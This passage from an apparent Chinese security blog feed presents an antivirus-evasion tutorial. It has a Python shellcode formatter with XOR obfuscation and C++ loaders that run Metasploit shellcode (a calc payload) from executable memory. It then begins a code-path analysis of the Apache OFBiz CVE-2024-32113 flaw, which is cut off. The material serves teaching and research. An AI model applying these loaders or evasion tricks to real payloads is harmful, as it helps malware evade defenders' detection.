class="hljs-string">&quot;rb&quot;</span>), <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输入文件路径&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;mode&quot;</span>, choices=[<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;cs&quot;</span>], <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出模式：c 或 cs&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-x&quot;</span>, <span class="hljs-string">&quot;--xor&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;XOR 密钥&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出xor的bin文件&quot;</span>)<br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> args.xor:<br>        xor_key = args.xor<br>    <span class="hljs-keyword">else</span>:<br>        xor_key = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> args.mode == <span class="hljs-string">&quot;c&quot;</span>:<br>        <span class="hljs-comment"># 适用于 C shellcode</span><br>        shellcode = <span class="hljs-string">&quot;\&quot;&quot;</span><br>        ctr = <span class="hljs-number">1</span><br>        maxlen = <span class="hljs-number">15</span><br><br>        bytearray_data = <span class="hljs-built_in">bytearray</span>(args.file.read())<br><br>        <span class="hljs-keyword">if</span> xor_key:<br>            apply_xor(bytearray_data, xor_key, args.output)<br><br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytearray_data:<br>            shellcode += <span class="hljs-string">&quot;\\x&quot;</span> + <span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;02x&#x27;</span>)<br>            <span class="hljs-keyword">if</span> ctr == maxlen:<br>                shellcode += <span class="hljs-string">&quot;\&quot; \n\&quot;&quot;</span><br>                ctr = <span class="hljs-number">0</span><br>            ctr += <span class="hljs-number">1</span><br>        shellcode += <span class="hljs-string">&quot;\&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsigned char buf[] =\n&quot;</span> + shellcode + <span class="hljs-string">&quot;;&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 适用于 C# shellcode</span><br>        shellcode_raw = <span class="hljs-string">&quot;&quot;</span><br>        shellcode_hex = <span class="hljs-string">&quot;&quot;</span><br>        ctr = <span class="hljs-number">1</span><br>        maxlen = <span class="hljs-number">15</span><br><br>        bytearray_data = <span class="hljs-built_in">bytearray</span>(args.file.read())<br><br>        <span class="hljs-keyword">if</span> xor_key:<br>            apply_xor(bytearray_data, xor_key, args.output)<br><br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytearray_data:<br>            shellcode_hex += <span class="hljs-string">&quot;0x&quot;</span> + <span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;02x&#x27;</span>) + <span class="hljs-string">&quot;,&quot;</span><br>            <span class="hljs-keyword">if</span> ctr == maxlen:<br>                shellcode_hex += <span class="hljs-string">&quot;\n&quot;</span><br>                ctr = <span class="hljs-number">0</span><br>            ctr += <span class="hljs-number">1</span><br>        length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bytearray_data))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;byte[] buf = new byte[&quot;</span> + length + <span class="hljs-string">&quot;] &#123;\n&quot;</span> + shellcode_hex[:-<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;&#125;;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="image-20240603141754747.png" alt="image-20240603141754747"></p><p>实现把bin转为可用的shellcode格式，-x是进行混淆，不带x就默认转格式，-o是bin进行xor在生成新的bin。</p><h2 id="0x05-关于Windows操作系统内存"><a href="#0x05-关于Windows操作系统内存" class="headerlink" title="0x05 关于Windows操作系统内存"></a>0x05 关于Windows操作系统内存</h2><p>​Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p><p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p><p>​在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</p><p>申请方式：</p><ul><li><p>HeapAlloc</p></li><li><p>malloc</p></li><li><p>VirtualAlloc</p></li><li><p>new</p></li><li><p>LocalAlloc</p></li><li><p>…</p><p>其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。</p></li></ul><h2 id="0x06-加载"><a href="#0x06-加载" class="headerlink" title="0x06 加载"></a>0x06 加载</h2><ul><li>不做处理</li></ul><p>直接使用msf生成的c代码，可以正常加载</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, TCHAR* argv[])</span> </span>&#123;<br><br>    <span class="hljs-type">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =<br>        <span class="hljs-string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;</span><br>        <span class="hljs-string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span><br>        <span class="hljs-string">&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;</span><br>        <span class="hljs-string">&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span><br>        <span class="hljs-string">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span><br>        <span class="hljs-string">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;</span><br>        <span class="hljs-string">&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;</span><br>        <span class="hljs-string">&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;</span><br>        <span class="hljs-string">&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;</span><br>        <span class="hljs-string">&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;</span><br>        <span class="hljs-string">&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;</span><br>        <span class="hljs-string">&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span><br>        <span class="hljs-string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;</span><br>        <span class="hljs-string">&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;</span><br>        <span class="hljs-string">&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;</span><br>        <span class="hljs-string">&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;</span><br>        <span class="hljs-string">&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;</span><br>        <span class="hljs-string">&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;</span><br>        <span class="hljs-string">&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;</span><br>        <span class="hljs-string">&quot;\xd5\x63\x61\x6c\x63\x00&quot;</span>;<br>    <span class="hljs-comment">// 获取shellcode大小</span><br>    shellcode_size = <span class="hljs-built_in">sizeof</span>(buf);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    VirtualAlloc(</span><br><span class="hljs-comment">        NULL, // 基址</span><br><span class="hljs-comment">        800,  // 大小</span><br><span class="hljs-comment">        MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">        );</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">char</span>* shellcode = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<br>        <span class="hljs-literal">NULL</span>,<br>        shellcode_size,<br>        MEM_COMMIT,<br>        PAGE_EXECUTE_READWRITE<br>    );<br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>    <span class="hljs-built_in">CopyMemory</span>(shellcode, buf, shellcode_size);<br><br>    hThread = <span class="hljs-built_in">CreateThread</span>(<br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>        (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>        &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240603193122307.png" alt="image-20240603193122307"></p><ul><li>进行一次xor 10</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">load</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-type">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><br>    <span class="hljs-comment">//calc.bin xor 10</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =<br>        <span class="hljs-string">&quot;\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a&quot;</span><br>        <span class="hljs-string">&quot;\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5&quot;</span><br>        <span class="hljs-string">&quot;\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58&quot;</span><br>        <span class="hljs-string">&quot;\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb&quot;</span><br>        <span class="hljs-string">&quot;\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81&quot;</span><br>        <span class="hljs-string">&quot;\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09&quot;</span><br>        <span class="hljs-string">&quot;\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81&quot;</span><br>        <span class="hljs-string">&quot;\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e&quot;</span><br>        <span class="hljs-string">&quot;\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1&quot;</span><br>        <span class="hljs-string">&quot;\x87\x57\x60\x0b\x87\x8f\xb8\x0a\x0a\x0a\x5a\x62\x3b\x81\x65&quot;</span><br>        <span class="hljs-string">&quot;\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf&quot;</span><br>        <span class="hljs-string">&quot;\x36\x0c\x76\x00\x8a\xf1\xea\x7f\x0f\xb1\x4d\x19\x78\x65\x60&quot;</span><br>        <span class="hljs-string">&quot;\x0a\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\x0a&quot;</span>;<br><br>    <span class="hljs-comment">// 获取shellcode大小</span><br>    shellcode_size = <span class="hljs-built_in">sizeof</span>(buf);<br><br>    <span class="hljs-comment">/* 增加异或代码 */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; shellcode_size; i++) &#123;<br>        buf[i] ^= <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    VirtualAlloc(</span><br><span class="hljs-comment">        NULL, // 基址</span><br><span class="hljs-comment">        800,  // 大小</span><br><span class="hljs-comment">        MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">        );</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">char</span>* shellcode = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<br>        <span class="hljs-literal">NULL</span>,<br>        shellcode_size,<br>        MEM_COMMIT,<br>        PAGE_EXECUTE_READWRITE<br>    );<br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>    <span class="hljs-built_in">CopyMemory</span>(shellcode, buf, shellcode_size);<br><br>    hThread = <span class="hljs-built_in">CreateThread</span>(<br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>        (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>        &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>&#125;<br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input a string and XOR&#x27;s number!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> xor_key = <span class="hljs-built_in">atoi</span>(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">load</span>(xor_key);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="image-20240603202020801.png" alt="image-20240603202020801"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://rvn0xsy.github.io/archivers/2019-11-10/2/">https://rvn0xsy.github.io/archivers/2019-11-10/2/</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目录遍历致代码执行漏洞（CVE-2024-32113）分析’</title>
    <link href="/2024/05/28/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-32113%EF%BC%89%E5%88%86%E6%9E%90%E2%80%99/"/>
    <url>/2024/05/28/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-32113%EF%BC%89%E5%88%86%E6%9E%90%E2%80%99/</url>
    
    <content type="html"><![CDATA[<h2 id="目录遍历致代码执行漏洞（CVE-2024-32113）分析"><a href="#目录遍历致代码执行漏洞（CVE-2024-32113）分析" class="headerlink" title="目录遍历致代码执行漏洞（CVE-2024-32113）分析"></a>目录遍历致代码执行漏洞（CVE-2024-32113）分析</h2><p>先知首发 <a href="https://xz.aliyun.com/t/14733">https://xz.aliyun.com/t/14733</a></p><h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​Apache OFBiz是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。2024年5月，官方发布新版本修复了CVE-2024-32113 Apache OFBiz 目录遍历致代码执行漏洞，攻击者可构造恶意请求控制服务器。建议尽快修复漏洞。</p><h3 id="0X02-Groovy执行分析"><a href="#0X02-Groovy执行分析" class="headerlink" title="0X02  Groovy执行分析"></a>0X02  Groovy执行分析</h3><p>&#x2F;framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml </p><p>412-416行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">request-map</span> <span class="hljs-attr">uri</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">security</span> <span class="hljs-attr">https</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">auth</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;view&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;view&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">request-map</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到是view类型</p><p>652行写着对应配置位置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">view-map</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;screen&quot;</span> <span class="hljs-attr">page</span>=<span class="hljs-string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;</span><br><br></code></pre></td></tr></table></figure><p>apache-ofbiz-18.12.11&#x2F;framework&#x2F;webtools&#x2F;widget&#x2F;EntityScreens.xml</p><p>74-96行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">screen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">actions</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;titleProperty&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;PageTitleEntityExportAll&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;tabButtonItem&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;programExport&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/groovyScripts/entity/ProgramExport.groovy&quot;</span>/&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">actions</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">widgets</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">decorator-screen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;CommonImportExportDecorator&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;$&#123;parameters.mainDecoratorLocation&#125;&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;<span class="hljs-name">decorator-section</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;body&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                     <span class="hljs-tag">&lt;<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;<span class="hljs-name">include-form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/widget/MiscForms.xml&quot;</span>/&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;/<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;<span class="hljs-name">platform-specific</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                            <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html-template</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/template/entity/ProgramExport.ftl&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;/<span class="hljs-name">platform-specific</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;/<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;/<span class="hljs-name">decorator-section</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;/<span class="hljs-name">decorator-screen</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">widgets</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;/<span class="hljs-name">screen</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure><p>可以看见调用了</p><p> &#x2F;webtools&#x2F;groovyScripts&#x2F;entity&#x2F;ProgramExport.groovy</p><p>56-82行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">    parameters.groovyProgram = groovyProgram<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    groovyProgram = parameters.groovyProgram<br>&#125;<br><br><span class="hljs-comment">// Add imports for script.</span><br><span class="hljs-type">def</span> <span class="hljs-variable">importCustomizer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImportCustomizer</span>()<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.GenericValue&quot;</span>)<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.model.ModelEntity&quot;</span>)<br><span class="hljs-type">def</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 